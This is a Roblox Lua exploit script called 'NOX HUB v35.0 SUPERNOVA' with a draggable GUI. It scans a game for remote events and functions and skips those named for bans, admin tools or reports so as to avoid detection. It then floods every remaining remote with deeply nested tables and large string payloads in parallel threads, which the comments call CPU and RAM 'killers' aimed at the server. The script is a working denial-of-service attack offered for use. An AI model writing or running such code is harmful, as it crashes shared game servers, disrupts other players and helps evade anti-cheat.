--[[
    🔱 NOX HUB v35.0 [SUPERNOVA] 🔱
    "Brighter than a thousand suns. The ultimate overload."
    
    SUPERNOVA FEATURES:
    - [ASYNC BOMBARDMENT] : Uses 'FireServer' to prevent client lag. Zero waiting.
    - [HYBRID PAYLOAD] : Alternates between Deep Tables (CPU Kill) and Heavy Strings (RAM Kill).
    - [MULTI-THREADED] : Dedicates a separate attack thread to EVERY remote found.
    - [SAFETY SHIELD] : Active protection against HoneyPots (DevTools, Market).
]]

-- // CORE SERVICES //
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- // 1. SUPERNOVA ENGINE //
local Engine = {
    Active = false,
    Targets = {},
    Buffer = {} 
}

function Engine:Scan()
    Engine.Targets = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local n = v.Name:lower()
            -- THE SHIELD (Critical for survival)
            if not (n:find("ban") or n:find("kick") or n:find("admin") or 
                    n:find("market") or n:find("purchase") or n:find("shop") or 
                    n:find("product") or n:find("asset") or n:find("prompt") or
                    n:find("devtools") or n:find("console") or n:find("debug") or
                    n:find("warn") or n:find("error") or n:find("report")) then
                 table.insert(Engine.Targets, v)
            end
        end
    end
end

function Engine:Supernova(duration, updateCallback)
    if Engine.Active then return end
    Engine.Active = true
    
    Engine:Scan()
    
    if #Engine.Targets == 0 then
        updateCallback(0, "NO SAFE TARGETS.")
        Engine.Active = false
        return
    end
    
    -- PAYLOAD 1: DEEP NEST (CPU KILLER)
    local RemoteBomb = {}
    local Current = RemoteBomb
    for i = 1, 90 do Current[1] = {}; Current = Current[1] end
    
    -- PAYLOAD 2: HEAVY STRING (RAM KILLER) - Smaller than v33 to avoid Bandwidth Ban
    local RamBomb = table.create(500, string.rep("🔥", 100))
    
    task.spawn(function()
        local StartTime = tick()
        local EndTime = StartTime + duration
        
        -- PHASE 1: THE GATLING GUN
        -- We spawn a SEPARATE thread for EACH Target.
        -- This ensures we hit every vulnerability simultaneously.
        
        local Threads = {}
        
        for _, remote in pairs(Engine.Targets) do
            local t = task.spawn(function()
                while Engine.Active and tick() < EndTime do
                    -- High Speed Loop
                    -- We alternate payloads to confuse the parser
                    pcall(function()
                        -- FIRE 1 (CPU)
                        if remote:IsA("RemoteEvent") then remote:FireServer(RemoteBomb)
                        else task.spawn(function() remote:InvokeServer(RemoteBomb) end) end
                    end)
                    
                    pcall(function()
                        -- FIRE 2 (RAM)
                        if remote:IsA("RemoteEvent") then remote:FireServer(RamBomb)
                        else task.spawn(function() remote:InvokeServer(RamBomb) end) end
                    end)
                    
                    -- Micro-Sleep prevents Client Lag (User requested no lag)
                    -- But we keep it extremely fast.
                    RunService.Heartbeat:Wait()
                end
            end)
            table.insert(Threads, t)
        end
        
        -- MONITORING LOOP
        while tick() < EndTime do
            local remaining = math.ceil(EndTime - tick())
            updateCallback(remaining, "SUPERNOVA BURNING... ["..#Engine.Targets.." VECTORS]")
            wait(1)
        end
        
        Engine.Active = false
        updateCallback(duration, "SYSTEM COOLDOWN")
    end)
end

-- // 2. COMMAND CENTER UI (Supernova Theme) //
local Nox = {}

function Nox:CreateUI()
    for _, v in pairs(CoreGui:GetChildren()) do if v.Name:find("Nox") then v:Destroy() end end
    
    local Screen = Instance.new("ScreenGui")
    Screen.Name = "NoxCommand"
    pcall(function() Screen.Parent = CoreGui end)
    
    -- MAIN WINDOW
    local Main = Instance.new("Frame", Screen)
    Main.Size = UDim2.new(0, 500, 0, 350)
    Main.Position = UDim2.new(0.5, -250, 0.5, -175)
    Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- Blinding White
    Main.BorderSizePixel = 0
    Main.ClipsDescendants = true
    
    local Corner = Instance.new("UICorner", Main)
    Corner.CornerRadius = UDim.new(0, 10)
    
    local Gradient = Instance.new("UIGradient", Main)
    Gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 240, 200)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 200, 100))
    }
    Gradient.Rotation = 45
    
    local TopBar = Instance.new("Frame", Main)
    TopBar.Size = UDim2.new(1, 0, 0, 40)
    TopBar.BackgroundColor3 = Color3.fromRGB(255, 150, 0)
    
    local Title = Instance.new("TextLabel", TopBar)
    Title.Text = "NOX SUPERNOVA v35.0"
    Title.Font = Enum.Font.GothamBlack
    Title.TextColor3 = Color3.fromRGB(255, 255, 255) 
    Title.TextSize = 16
    Title.Size = UDim2.new(0.5, 0, 1, 0)
    Title.Position = UDim2.new(0.05, 0, 0, 0)
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.BackgroundTransparency = 1
    
    -- TABS
    local Tabs = Instance.new("Frame", Main)
    Tabs.Size = UDim2.new(0.25, 0, 0.85, 0) 
    Tabs.Position = UDim2.new(0, 0, 0.15, 0)
    Tabs.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Tabs.BackgroundTransparency = 0.5
    Tabs.BorderSizePixel = 0
    
    local function CreateTabBtn(text, order, callback)
        local btn = Instance.new("TextButton", Tabs)
        btn.Size = UDim2.new(1, 0, 0, 40)
        btn.Position = UDim2.new(0, 0, 0, (order-1)*40)
        btn.Text = text
        btn.TextColor3 = Color3.fromRGB(150, 100, 0)
        btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        btn.Font = Enum.Font.GothamBold
        btn.BorderSizePixel = 0
        
        btn.MouseButton1Click:Connect(function()
            for _, c in pairs(Tabs:GetChildren()) do if c:IsA("TextButton") then c.TextColor3 = Color3.fromRGB(150, 100, 0) c.BackgroundColor3 = Color3.fromRGB(255, 255, 255) end end
            btn.TextColor3 = Color3.fromRGB(255, 50, 0) 
            btn.BackgroundColor3 = Color3.fromRGB(255, 240, 200)
            callback()
        end)
        return btn
    end
    
    -- CONTENT AREA
    local Content = Instance.new("Frame", Main)
    Content.Size = UDim2.new(0.75, 0, 0.85, 0)
    Content.Position = UDim2.new(0.25, 0, 0.15, 0)
    Content.BackgroundTransparency = 1
    
    -- PAGE 1: ATTACK
    local PageAttack = Instance.new("Frame", Content)
    PageAttack.Size = UDim2.new(1, 0, 1, 0)
    PageAttack.BackgroundTransparency = 1
    
    local StatusLbl = Instance.new("TextLabel", PageAttack)
    StatusLbl.Text = "READY TO IGNITE"
    StatusLbl.Size = UDim2.new(1, 0, 0, 30)
    StatusLbl.Position = UDim2.new(0, 0, 0.1, 0)
    StatusLbl.TextColor3 = Color3.fromRGB(255, 100, 0)
    StatusLbl.Font = Enum.Font.GothamBlack
    StatusLbl.BackgroundTransparency = 1
    
    local BufferBarBg = Instance.new("Frame", PageAttack)
    BufferBarBg.Size = UDim2.new(0.8, 0, 0.05, 0)
    BufferBarBg.Position = UDim2.new(0.1, 0, 0.3, 0)
    BufferBarBg.BackgroundColor3 = Color3.fromRGB(255, 200, 150)
    
    local BufferBarFill = Instance.new("Frame", BufferBarBg)
    BufferBarFill.Size = UDim2.new(0, 0, 1, 0)
    BufferBarFill.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
    
    local MainBtn = Instance.new("TextButton", PageAttack)
    MainBtn.Size = UDim2.new(0.6, 0, 0.2, 0)
    MainBtn.Position = UDim2.new(0.2, 0, 0.6, 0)
    MainBtn.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
    MainBtn.Text = "DETONATE (15s)"
    MainBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    MainBtn.Font = Enum.Font.GothamBlack
    local BtnCorner = Instance.new("UICorner", MainBtn)
    BtnCorner.CornerRadius = UDim.new(0, 6)
    
    MainBtn.MouseButton1Click:Connect(function()
        if not Engine.Active then
            Engine:Supernova(15, function(timeLeft, txt)
                StatusLbl.Text = txt
                local progress = (15 - timeLeft) / 15
                BufferBarFill.Size = UDim2.new(progress, 0, 1, 0)
                
                if timeLeft == 0 then
                   MainBtn.Text = "DETONATE (15s)"
                   BufferBarFill.Size = UDim2.new(0, 0, 1, 0)
                else
                   MainBtn.Text = "BURNING... " .. timeLeft
                end
            end)
        end
    end)
    
    -- PAGE 2: VISUALS
    local PageVisuals = Instance.new("Frame", Content)
    PageVisuals.Size = UDim2.new(1, 0, 1, 0)
    PageVisuals.BackgroundTransparency = 1
    PageVisuals.Visible = false
    
    local GraphFrame = Instance.new("Frame", PageVisuals)
    GraphFrame.Size = UDim2.new(0.9, 0, 0.6, 0)
    GraphFrame.Position = UDim2.new(0.05, 0, 0.2, 0)
    GraphFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    GraphFrame.BorderColor3 = Color3.fromRGB(255, 200, 100)
    GraphFrame.BorderSizePixel = 1
    
    for i = 1, 20 do
        local bar = Instance.new("Frame", GraphFrame)
        bar.Size = UDim2.new(0.04, 0, math.random()*0.5, 0)
        bar.Position = UDim2.new((i-1)*0.05, 0, 1 - bar.Size.Y.Scale, 0)
        bar.BackgroundColor3 = Color3.fromRGB(255, 150, 0)
        bar.BorderSizePixel = 0
        task.spawn(function()
            while GraphFrame.Parent do
                local targetHeight = Engine.Active and math.random(0.8, 1) or math.random(0, 0.2)
                bar:TweenSize(UDim2.new(0.04, 0, targetHeight, 0), "Out", "Quad", 0.1, true)
                wait(0.05)
            end
        end)
    end

    -- TABS LOGIC
    CreateTabBtn("ATTACK", 1, function() PageAttack.Visible = true; PageVisuals.Visible = false end)
    CreateTabBtn("MONITOR", 2, function() PageAttack.Visible = false; PageVisuals.Visible = true end)
    
     -- DRAG UI
    local dragging, dragInput, dragStart, startPos
    Main.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = Main.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
            local delta = input.Position - dragStart
            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
end

Nox:CreateUI()
